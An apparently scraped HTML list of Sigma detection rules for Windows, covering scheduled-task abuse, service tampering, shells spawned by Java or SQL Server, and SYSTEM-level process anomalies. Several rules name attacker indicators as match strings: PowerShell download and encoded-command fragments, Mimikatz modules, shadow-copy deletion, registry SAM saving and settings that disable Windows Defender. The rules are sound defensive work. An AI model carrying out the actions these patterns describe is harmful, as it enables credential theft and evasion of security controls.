<li><a href="#">title:Suspicious Runscripthelper.exe id: eca49c87-8a75-4f13-9c73-a5a29e845f03 status: test description: Detects execution of powershell scripts via Runscripthelper.exe author: Victor Sergeev, oscd.community references: - date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: '\Runscripthelper.exe' cmd: CommandLine|contains: 'surfacecheck' condition: image_path and cmd fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059 - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Suspicious Sc Query id: 57712d7a-679c-4a41-a913-87e7175ae429 status: experimental description: Adversaries may try to get information about registered services references: - author: frack113 date: 2021/12/06 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'sc query' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1007 
<li><a href="#">title:Suspicious Scan Loop Network id: f8ad2e2c-40b6-4117-84d7-20b89896ab23 status: experimental description: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system author: frack113 references: - - - date: 2022/03/12 logsource: category: process_creation product: windows detection: selection_loop: CommandLine|contains: - 'for ' - 'foreach ' selection_tools: CommandLine|contains: - 'nslookup' - 'ping' condition: all of selection_* falsepositives: - Legitimate script level: medium tags: - attack.execution - attack.t1059 - attack.discovery - attack.t1018 
<li><a href="#">title:Suspicious Scheduled Task Creation Involving Temp Folder id: 39019a4e-317f-4ce3-ae63-309a8c6b53c5 status: experimental description: Detects the creation of scheduled tasks that involves a temporary folder and runs only once author: Florian Roth date: 2021/03/11 references: - logsource: category: process_creation product: windows detection: selection: Image|endswith: '\schtasks.exe' CommandLine|contains|all: - ' /create ' - ' /sc once ' - '\Temp\' condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.execution - attack.persistence - attack.t1053.005 falsepositives: - Administrative activity - Software installation level: high 
<li><a href="#">title:Suspicious Scheduled Task Write to System32 Tasks id: 80e1f67a-4596-4351-98f5-a9c3efabac95 status: experimental description: Detects the creation of tasks from processes executed from suspicious locations references: - Internal Research author: Florian Roth date: 2021/11/16 modified: 2022/01/12 tags: - attack.persistence - attack.execution - attack.t1053 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: '\Windows\System32\Tasks' Image|contains: - '\AppData\' - 'C:\PerfLogs' - '\Windows\System32\config\systemprofile' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Schtasks Execution AppData Folder id: c5c00f49-b3f9-45a6-997e-cfdecc6e1967 status: experimental description: 'Detects the creation of a schtask that executes a file from C:\Users\<USER>\AppData\Local' author: 'pH-T' references: - date: 2022/03/15 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\schtasks.exe' CommandLine|contains|all: - '/Create' - '/RU "NT AUT' - '/TR' - 'C:\Users\' - '\AppData\Local\' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.persistence - attack.t1053.005 - attack.t1059.001 
<li><a href="#">title:Suspicious ScreenSave Change by Reg.exe id: 0fc35fc3-efe6-4898-8a37-0b233339524f status: experimental author: frack113 date: 2021/08/19 modified: 2022/06/02 description: | Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension references: - - tags: - attack.privilege_escalation - attack.t1546.002 logsource: category: process_creation product: windows detection: selection_reg: Image|endswith: '\reg.exe' CommandLine|contains: - 'HKEY_CURRENT_USER\Control Panel\Desktop' - 'HKCU\Control Panel\Desktop' selection_option_1: # /force Active ScreenSaveActive CommandLine|contains|all: - '/v ScreenSaveActive' - '/t REG_SZ' - '/d 1' - '/f' selection_option_2: # /force set ScreenSaveTimeout CommandLine|contains|all: - '/v ScreenSaveTimeout' - '/t REG_SZ' - '/d ' - '/f' selection_option_3: # /force set ScreenSaverIsSecure CommandLine|contains|all: - '/v ScreenSaverIsSecure' - '/t REG_SZ' - '/d 0' - '/f' selection_option_4: # /force set a .scr CommandLine|contains|all: - '/v SCRNSAVE.EXE' - '/t REG_SZ' - '/d ' - '.scr' - '/f' condition: selection_reg and 1 of selection_option_* falsepositives: - GPO level: medium 
<li><a href="#">title:Suspicious Screensaver Binary File Creation id: 97aa2e88-555c-450d-85a6-229bcd87efb8 status: experimental description: | Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension author: frack113 references: - date: 2021/12/29 modified: 2022/01/10 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '.scr' filter: Image|endswith: - '\Kindle.exe' - '\Bin\ccSvcHst.exe' # Symantec Endpoint Protection condition: selection and not 1 of filter* falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1546.002 
<li><a href="#">title:Suspicious Script Execution From Temp Folder id: a6a39bdb-935c-4f0a-ab77-35f4bbf44d33 description: Detects a suspicious script executions from temporary folder status: experimental references: - author: Florian Roth, Max Altgelt date: 2021/07/14 modified: 2021/11/11 tags: - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\powershell.exe' - '\mshta.exe' - '\wscript.exe' - '\cscript.exe' CommandLine|contains: - '\Windows\Temp' - '\Temporary Internet' - '\AppData\Local\Temp' - '\AppData\Roaming\Temp' - '%TEMP%' - '%TMP%' - '%LocalAppData%\Temp' filter: CommandLine|contains: - ' >' - 'Out-File' - 'ConvertTo-Json' - '-WindowStyle hidden -Verb runAs' # VSCode behaviour if file cannot be written as current user condition: selection and not filter falsepositives: - Administrative scripts level: high 
<li><a href="#">title:Suspicious Scripting in a WMI Consumer id: fe21810c-2a8c-478f-8dd3-5a287fb2a0e0 status: experimental description: Detects suspicious scripting in WMI Event Consumers author: Florian Roth, Jonhnathan Ribeiro references: - - - date: 2019/04/15 modified: 2021/09/01 logsource: product: windows category: wmi_event detection: selection_destination: - Destination|contains|all: - 'new-object' - 'net.webclient' - '.downloadstring' - Destination|contains|all: - 'new-object' - 'net.webclient' - '.downloadfile' - Destination|contains: - ' iex(' - 'WScript.shell' - ' -nop ' - ' -noprofile ' - ' -decode ' - ' -enc ' - Destination|contains: - 'WScript.Shell' - 'System.Security.Cryptography.FromBase64Transform' condition: selection_destination fields: - User - Operation falsepositives: - Administrative scripts level: high tags: - attack.execution - attack.t1059.005 
<li><a href="#">title:Suspicious Service Binary Directory id: 883faa95-175a-4e22-8181-e5761aeb373c description: Detects a service binary running in a suspicious directory author: Florian Roth date: 2021/03/09 status: experimental references: - logsource: category: process_creation product: windows detection: selection: Image|contains: - '\Users\Public\' - '\$Recycle.bin' - '\Users\All Users\' - '\Users\Default\' - '\Users\Contacts\' - '\Users\Searches\' - 'C:\Perflogs\' - '\config\systemprofile\' - '\Windows\Fonts\' - '\Windows\IME\' - '\Windows\addins\' ParentImage|endswith: - '\services.exe' - '\svchost.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Suspicious Service DACL Modification id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 status: test description: Detects suspicious DACL modifications that can be used to hide services or make them unstopable author: Jonhnathan Ribeiro, oscd.community references: - - date: 2020/10/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\sc.exe' CommandLine|contains|all: - 'sdset' - 'D;;' sids: CommandLine|contains: - ';;;IU' - ';;;SU' - ';;;BA' - ';;;SY' - ';;;WD' condition: selection and sids falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1543.003 
<li><a href="#">title:Suspicious Service Installation id: 1d61f71d-59d2-479e-9562-4ff5f4ead16b status: experimental description: Detects suspicious service installation commands author: pH-T date: 2022/03/18 modified: 2022/05/02 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 suspicious1: ImagePath|contains: - ' -w hidden ' - ' -nop ' - ' -sta ' - '\Users\Public\' - '\Windows\Temp\' - '\Perflogs\' - '\\\\.\\pipe' - '\ADMIN$\' - '.downloadstring(' # PowerShell download command - '.downloadfile(' # PowerShell download command suspicious2a: ImagePath|contains: ' -e' suspicious2b: ImagePath|contains: - ' JAB' # PowerShell encoded commands - ' SUVYI' # PowerShell encoded commands - ' SQBFAFgA' # PowerShell encoded commands - ' aWV4I' # PowerShell encoded commands - ' IAB' # PowerShell encoded commands - ' PAA' # PowerShell encoded commands - ' aQBlAHgA' # PowerShell encoded commands filter_thor_remote: ImagePath|startswith: 'C:\WINDOWS\TEMP\thor10-remote\thor64.exe' condition: selection and ( suspicious1 or all of suspicious2* ) and not 1 of filter_* falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - car.2013-09-005 - attack.t1543.003 
<li><a href="#">title:Suspicious Service Installation Script id: 70f00d10-60b2-4f34-b9a0-dc3df3fe762a status: experimental description: Detects suspicious service installation scripts author: pH-T date: 2022/03/18 modified: 2022/03/24 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 suspicious1: ImagePath|contains: ' /C ' suspicious2: ImagePath|contains: - 'powershell' - 'wscript' - 'cscript' - 'mshta' - 'rundll32' condition: selection and all of suspicious* falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - car.2013-09-005 - attack.t1543.003 
<li><a href="#">title:Suspicious Service Installed id: f2485272-a156-4773-82d7-1d178bc4905b status: test description: Detects installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders. Both services are used in the tool Ghost-In-The-Logs (), which uses KDU () author: xknow (@xknow_infosec), xorxes (@xor_xes) references: - date: 2019/04/08 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection_1: EventType: SetValue TargetObject: - 'HKLM\System\CurrentControlSet\Services\NalDrv\ImagePath' - 'HKLM\System\CurrentControlSet\Services\PROCEXP152\ImagePath' selection_2: Image|endswith: - '\procexp64.exe' - '\procexp.exe' - '\procmon64.exe' - '\procmon.exe' selection_3: Details|contains: '\WINDOWS\system32\Drivers\PROCEXP152.SYS' condition: selection_1 and not selection_2 and not selection_3 falsepositives: - Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don't rely on it. level: medium tags: - attack.t1562.001 - attack.defense_evasion 
<li><a href="#">title:Suspicious Service Path Modification id: 138d3531-8793-4f50-a2cd-f291b2863d78 status: test description: Detects service path modification to PowerShell or cmd. author: Victor Sergeev, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\sc.exe' CommandLine|contains|all: - 'config' - 'binpath' selection_2: CommandLine|contains: - 'powershell' - 'cmd' condition: selection_1 and selection_2 fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 
<li><a href="#">title:Suspicious Serv-U Process Pattern id: 58f4ea09-0fc2-4520-ba18-b85c540b0eaf status: experimental description: Detects a suspicious process pattern which could be a sign of an exploited Serv-U service author: Florian Roth date: 2021/07/14 references: - logsource: category: process_creation product: windows tags: - attack.credential_access - attack.t1555 - cve.2021.35211 detection: selection: ParentImage|endswith: '\Serv-U.exe' Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\schtasks.exe' - '\regsvr32.exe' - '\wmic.exe' # - '\mshta.exe' - '\rundll32.exe' - '\msiexec.exe' - '\forfiles.exe' - '\scriptrunner.exe' condition: selection falsepositives: - Legitimate uses in which users or programs use the SSH service of Serv-U for remote command execution level: high 
<li><a href="#">title:Suspicious Set Value of MSDT in Registry (CVE-2022-30190) id: 2d9403d5-7927-46b7-8216-37ab7c9ec5e3 status: experimental description: Detects set value ms-msdt MSProtocol URI scheme in Registry that could be an attempt to exploit CVE-2022-30190. author: Sittikorn S references: - - date: 2020/05/31 logsource: product: windows category: registry_set detection: selection: EventType: SetValue TargetObject|startswith: 'HKCR\ms-msdt\' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1221 
<li><a href="#">title:Suspicious Shells Spawn by Java id: 0d34ed8b-1c12-4ff2-828c-16fc860b766d description: Detects suspicious shell spawn from Java host process (e.g. log4j exploitation) status: experimental author: Andreas Hunkeler (@Karneades), Florian Roth date: 2021/12/17 modified: 2021/12/22 tags: - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\java.exe' Image|endswith: - '\sh.exe' - '\bash.exe' - '\powershell.exe' - '\schtasks.exe' - '\certutil.exe' - '\whoami.exe' - '\bitsadmin.exe' - '\wscript.exe' - '\cscript.exe' - '\scrcons.exe' - '\regsvr32.exe' - '\hh.exe' - '\wmic.exe' # - '\mshta.exe' - '\rundll32.exe' - '\forfiles.exe' - '\scriptrunner.exe' - '\mftrace.exe' - '\AppVLP.exe' - '\curl.exe' condition: selection falsepositives: - Legitimate calls to system binaries - Company specific internal usage level: high 
<li><a href="#">title:Suspicious Shells Spawn by Java Utility Keytool id: 90fb5e62-ca1f-4e22-b42e-cc521874c938 description: Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation) status: experimental author: Andreas Hunkeler (@Karneades) date: 2021/12/22 references: - - tags: - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\keytool.exe' Image|endswith: - '\cmd.exe' - '\sh.exe' - '\bash.exe' - '\powershell.exe' - '\schtasks.exe' - '\certutil.exe' - '\whoami.exe' - '\bitsadmin.exe' - '\wscript.exe' - '\cscript.exe' - '\scrcons.exe' - '\regsvr32.exe' - '\hh.exe' - '\wmic.exe' - '\mshta.exe' - '\rundll32.exe' - '\forfiles.exe' - '\scriptrunner.exe' - '\mftrace.exe' - '\AppVLP.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Shells Spawn by SQL Server id: 869b9ca7-9ea2-4a5a-8325-e80e62f75445 description: Detects suspicious shell spawn from MSSQL process, this might be sight of RCE or SQL Injection status: experimental author: FPT.EagleEye Team, wagga date: 2020/12/11 modified: 2022/03/08 tags: - attack.t1505.003 - attack.t1190 - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\sqlservr.exe' Image|endswith: - '\cmd.exe' - '\sh.exe' - '\bash.exe' - '\powershell.exe' - '\bitsadmin.exe' filter_datev: ParentImage|startswith: 'C:\Program Files\Microsoft SQL Server\' ParentImage|endswith: 'DATEV_DBENGINE\MSSQL\Binn\sqlservr.exe' Image: 'C:\Windows\System32\cmd.exe' CommandLine|startswith: '"C:\Windows\system32\cmd.exe" ' condition: selection and not 1 of filter* level: high 
<li><a href="#">title:Suspicious Splwow64 Without Params id: 1f1a8509-2cbb-44f5-8751-8e1571518ce2 status: experimental description: Detects suspicious Splwow64.exe process without any command line parameters references: - author: Florian Roth date: 2021/08/23 modified: 2021/11/29 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\splwow64.exe' CommandLine|endswith: 'splwow64.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:Suspicious Spool Service Child Process id: dcdbc940-0bff-46b2-95f3-2d73f848e33b status: stable description: Detects suspicious print spool service (spoolsv.exe) child processes. references: - tags: - attack.execution - attack.t1203 - attack.privilege_escalation - attack.t1068 author: Justin C. (@endisphotic), @dreadphones (detection), Thomas Patzke (Sigma rule) date: 2021/07/11 modified: 2022/06/02 logsource: category: process_creation product: windows detection: spoolsv: ParentImage|endswith: \spoolsv.exe IntegrityLevel: System suspicious_unrestricted: Image|endswith: - \gpupdate.exe - \whoami.exe - \nltest.exe - \taskkill.exe - \wmic.exe - \taskmgr.exe - \sc.exe - \findstr.exe - \curl.exe - \wget.exe - \certutil.exe - \bitsadmin.exe - \accesschk.exe - \wevtutil.exe - \bcdedit.exe - \fsutil.exe - \cipher.exe - \schtasks.exe - \write.exe - \wuauclt.exe suspicious_net: Image|endswith: \net.exe suspicious_net_filter: CommandLine|contains: start suspicious_cmd: Image|endswith: \cmd.exe suspicious_cmd_filter: CommandLine|contains: - .spl - route add - program files suspicious_netsh: Image|endswith: \netsh.exe suspicious_netsh_filter: CommandLine|contains: - 'add portopening' - 'rule name' suspicious_powershell: Image|endswith: \powershell.exe suspicious_powershell_filter: CommandLine|contains: .spl suspicious_rundll32: Image|endswith: \rundll32.exe CommandLine|endswith: rundll32.exe condition: spoolsv and ( suspicious_unrestricted or (suspicious_net and not suspicious_net_filter) or (suspicious_cmd and not suspicious_cmd_filter) or (suspicious_netsh and not suspicious_netsh_filter) or (suspicious_powershell and not suspicious_powershell_filter) or suspicious_rundll32 ) fields: - Image - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious SQL Error Messages id: 8a670c6d-7189-4b1c-8017-a417ca84a086 status: test description: Detects SQL error messages that indicate probing for an injection attack author: Bjoern Kimminich references: - date: 2017/11/27 modified: 2021/11/27 logsource: category: application product: sql detection: keywords: # Oracle - quoted string not properly terminated # MySQL - You have an error in your SQL syntax # SQL Server - Unclosed quotation mark # SQLite - 'near "*": syntax error' - SELECTs to the left and right of UNION do not have the same number of result columns condition: keywords falsepositives: - Application bugs level: high tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Suspicious SSL Connection id: 195626f3-5f1b-4403-93b7-e6cfd4d6a078 status: experimental description: Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. references: - - author: frack113 date: 2022/01/23 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - System.Net.Security.SslStream - Net.Security.RemoteCertificateValidationCallback - '.AuthenticateAsClient' condition: selection falsepositives: - Legitimate administrative script level: low tags: - attack.command_and_control - attack.t1573 
<li><a href="#">title:Suspicious Start-Process PassThru id: 0718cd72-f316-4aa2-988f-838ea8533277 status: experimental description: Powershell use PassThru option to start in background author: frack113 references: - - date: 2022/01/15 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Start-Process - '-PassThru ' - '-FilePath ' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1036.003 
<li><a href="#">title:Suspicious Start-Process PassThru id: 14c71865-6cd3-44ae-adaa-1db923fae5f2 related: - id: ec19ebab-72dc-40e1-9728-4c0b805d722c type: derived status: experimental description: Attempting to disable scheduled scanning and other parts of windows defender atp. Or set default actions to allow. author: frack113, elhoim references: - - - date: 2022/01/16 modified: 2022/05/05 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_options_disabling_preference: ScriptBlockText|contains: 'Set-MpPreference' selection_options_disabling_function: ScriptBlockText|contains: - 'DisableRealtimeMonitoring 1' - 'DisableBehaviorMonitoring 1' - 'DisableScriptScanning 1' - 'DisableArchiveScanning 1' - 'DisableBlockAtFirstSeen 1' - 'DisableIOAVProtection 1' - 'DisableIntrusionPreventionSystem 1' - 'DisableRemovableDriveScanning 1' - 'DisableScanningMappedNetworkDrivesForFullScan 1' - 'DisableScanningNetworkFiles 1' - 'DisableRealtimeMonitoring $true' - 'DisableBehaviorMonitoring $true' - 'DisableScriptScanning $true' - 'DisableArchiveScanning $true' - 'DisableBlockAtFirstSeen $true' - 'DisableIOAVProtection $true' - 'DisableIntrusionPreventionSystem $true' - 'DisableRemovableDriveScanning $true' - 'DisableScanningMappedNetworkDrivesForFullScan $true' - 'DisableScanningNetworkFiles $true' selection_default_actions_allow: ScriptBlockText|contains|all: - 'Set-MpPreference' - Allow ScriptBlockText|contains: - LowThreatDefaultAction - ModerateThreatDefaultAction - HighThreatDefaultAction condition: all of selection_options_disabling* or selection_default_actions_allow falsepositives: - Legitimate PowerShell scripts level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Suspicious Subsystem for Linux Bash Execution id: 5edc2273-c26f-406c-83f3-f4d948e740dd status: experimental description: Performs execution of specified file, can be used as a defensive evasion. references: - tags: - attack.defense_evasion - attack.t1202 author: frack113 date: 2021/11/24 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - bash.exe - '-c ' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Svchost Process id: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d status: experimental description: Detects a suspicious svchost process start tags: - attack.defense_evasion - attack.t1036.005 author: Florian Roth date: 2017/08/15 modified: 2022/06/28 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\svchost.exe' filter: ParentImage|endswith: - '\services.exe' - '\MsMpEng.exe' - '\Mrt.exe' - '\rpcnet.exe' - '\ngen.exe' - '\TiWorker.exe' filter_null1: ParentImage: null filter_null2: ParentImage: '' filter_emptysysmon: ParentImage: '-' condition: selection and not 1 of filter* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious SYSTEM User Process Creation id: 2617e7ed-adb7-40ba-b0f3-8f9945fe6c09 status: test description: Detects a suspicious process creation as SYSTEM user (suspicious program or command line parameter) references: - Internal Research - author: Florian Roth (rule), David ANDRE (additional keywords) date: 2021/12/20 modified: 2022/04/27 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: System User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' selection_special: - Image|endswith: - '\calc.exe' - '\wscript.exe' - '\cscript.exe' - '\hh.exe' - '\mshta.exe' - '\forfiles.exe' - '\ping.exe' - CommandLine|contains: # - 'sc stop ' # stops a system service # causes FPs - ' -NoP ' # Often used in malicious PowerShell commands - ' -W Hidden ' # Often used in malicious PowerShell commands - ' -decode ' # Used with certutil - ' /decode ' # Used with certutil - ' /urlcache ' # Used with certutil - ' -urlcache ' # Used with certutil - ' -e* JAB' # PowerShell encoded commands - ' -e* SUVYI' # PowerShell encoded commands - ' -e* SQBFAFgA' # PowerShell encoded commands - ' -e* aWV4I' # PowerShell encoded commands - ' -e* IAB' # PowerShell encoded commands - ' -e* PAA' # PowerShell encoded commands - ' -e* aQBlAHgA' # PowerShell encoded commands - 'vssadmin delete shadows' # Ransomware - 'reg SAVE HKLM' # save registry SAM - syskey extraction - ' -ma ' # ProcDump - 'Microsoft\Windows\CurrentVersion\Run' # Run key in command line - often in combination with REG ADD - '.downloadstring(' # PowerShell download command - '.downloadfile(' # PowerShell download command - ' /ticket:' # Rubeus - 'dpapi::' #Mimikatz - 'event::clear' #Mimikatz - 'event::drop' #Mimikatz - 'id::modify' #Mimikatz - 'kerberos::' #Mimikatz - 'lsadump::' #Mimikatz - 'misc::' #Mimikatz - 'privilege::' #Mimikatz - 'rpc::' #Mimikatz - 'sekurlsa::' #Mimikatz - 'sid::' #Mimikatz - 'token::' #Mimikatz - 'vault::cred' #Mimikatz - 'vault::list' #Mimikatz - ' p::d ' # Mimikatz - ';iex(' # PowerShell IEX - 'MiniDump' # Process dumping method apart from procdump - 'net user ' condition: all of selection* falsepositives: - Administrative activity - Scripts and administrative tools used in the monitored environment - Monitoring activity level: high 
<li><a href="#">title:Suspicious System.Drawing Load id: 666ecfc7-229d-42b8-821e-1a8f8cb7057c description: A General detection for processes loading System.Drawing.ni.dll. This could be an indicator of potential Screen Capture. status: experimental date: 2020/05/02 modified: 2021/12/05 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.collection - attack.t1113 references: - - logsource: product: windows category: image_load detection: selection: ImageLoaded|endswith: '\System.Drawing.ni.dll' filter: # The number of false positives was too high - we had to do this broader filter # based on the following paths that shouldn't be writable to an unprivileged user Image|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' - 'C:\Windows\System32\' - 'C:\Windows\Microsoft.NET\' - 'C:\Windows\ImmersiveControlPanel\' filter2: Image: - 'C:\Users\\*\AppData\Local\NhNotifSys\nahimic\nahimicNotifSys.exe' - 'C:\Users\\*\GitHubDesktop\Update.exe' - 'C:\Windows\System32\NhNotifSys.exe' condition: selection and not 1 of filter* falsepositives: - Unknown level: low # too many false positives 
<li><a href="#">title:Suspicious SYSVOL Domain Group Policy Access id: 05f3c945-dcc8-4393-9f3d-af65077a8f86 status: test description: Detects Access to Domain Group Policies stored in SYSVOL author: Markus Neis, Jonhnathan Ribeiro, oscd.community references: - - date: 2018/04/09 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '\SYSVOL\' - '\policies\' condition: selection falsepositives: - Administrative activity level: medium tags: - attack.credential_access - attack.t1552.006 
<li><a href="#">title:Suspicious Task Added by Bitsadmin id: 1ff315dc-2a3a-4b71-8dde-873818d25d39 status: experimental description: | Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model]() references: - author: frack113 date: 2022/03/01 logsource: product: windows service: bits-client detection: selection: EventID: 3 processPath|endswith: '\bitsadmin.exe' condition: selection falsepositives: - Administrator PowerShell scripts level: low tags: - attack.defense_evasion - attack.persistence - attack.t1197 
<li><a href="#">title:Suspicious Task Added by Powershell id: fe3a2d49-f255-4d10-935c-bda7391108eb status: experimental description: | Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model]() references: - author: frack113 date: 2022/03/01 logsource: product: windows service: bits-client detection: selection: EventID: 3 processPath|endswith: '\powershell.exe' condition: selection falsepositives: - Administrator PowerShell scripts level: low tags: - attack.defense_evasion - attack.persistence - attack.t1197 
<li><a href="#">title:Suspicious Tasklist Discovery Command id: 63332011-f057-496c-ad8d-d2b6afb27f96 status: experimental description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network references: - author: frack113 date: 2021/12/11 logsource: category: process_creation product: windows detection: selection: - CommandLine|contains: tasklist - Image: C:\Windows\System32\tasklist.exe condition: selection falsepositives: - Administrator, hotline ask to user level: low tags: - attack.discovery - attack.t1057 
<li><a href="#">title:Suspicious TeamViewer Domain Access id: 778ba9a8-45e4-4b80-8e3e-34a419f0b85e description: Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation) status: experimental date: 2022/01/30 modified: 2022/02/08 author: Florian Roth references: - tags: - attack.command_and_control - attack.t1219 logsource: product: windows category: dns_query detection: dns_request: QueryName: - 'taf.teamviewer.com' - 'udp.ping.teamviewer.com' filter: Image|contains: 'TeamViewer' condition: dns_request and not filter falsepositives: - Unknown binary names of TeamViewer - Other programs that also lookup the observed domain level: medium 
<li><a href="#">title:Suspicious TSCON Start as SYSTEM id: 9847f263-4a81-424f-970c-875dab15b79b status: experimental description: Detects a tscon.exe start as LOCAL SYSTEM references: - - - author: Florian Roth date: 2018/03/17 modified: 2022/05/27 tags: - attack.command_and_control - attack.t1219 logsource: category: process_creation product: windows detection: selection: User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' Image|endswith: '\tscon.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Typical Malware Back Connect Ports id: 4b89abaa-99fe-4232-afdd-8f9aa4d20382 status: test description: Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases author: Florian Roth references: - date: 2017/03/19 modified: 2022/02/02 logsource: category: network_connection product: windows definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch="include"><CallTrace condition="contains">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch="exclude"><CallTrace condition="excludes">UNKNOWN</CallTrace></ProcessAccess>' detection: selection: Initiated: 'true' DestinationPort: - '4443' - '2448' - '8143' - '1777' - '1443' - '243' - '65535' - '13506' - '3360' - '200' - '198' - '49180' - '13507' - '6625' - '4444' - '4438' - '1904' - '13505' - '13504' - '12102' - '9631' - '5445' - '2443' - '777' - '13394' - '13145' - '12103' - '5552' - '3939' - '3675' - '666' - '473' - '5649' - '4455' - '4433' - '1817' - '100' - '65520' - '1960' - '1515' - '743' - '700' - '14154' - '14103' - '14102' - '12322' - '10101' - '7210' - '4040' - '9943' filter1: Image|contains: '\Program Files' filter2: DestinationIp|startswith: - '10.' - '192.168.' - '172.16.' - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '127.' condition: selection and not 1 of filter* falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1571 
<li><a href="#">title:Suspicious UltraVNC Execution id: 871b9555-69ca-4993-99d3-35a59f9f3599 status: experimental author: Bhabesh Raj date: 2022/03/04 modified: 2022/03/09 description: Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group) references: - - tags: - attack.lateral_movement - attack.g0047 - attack.t1021.005 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '-autoreconnect ' - '-connect ' - '-id:' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Unattend.xml File Access id: 1a3d42dd-3763-46b9-8025-b5f17f340dfb status: experimental description: | Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored. If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process author: frack113 references: - date: 2021/12/19 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '\unattend.xml' condition: selection falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1552.001 
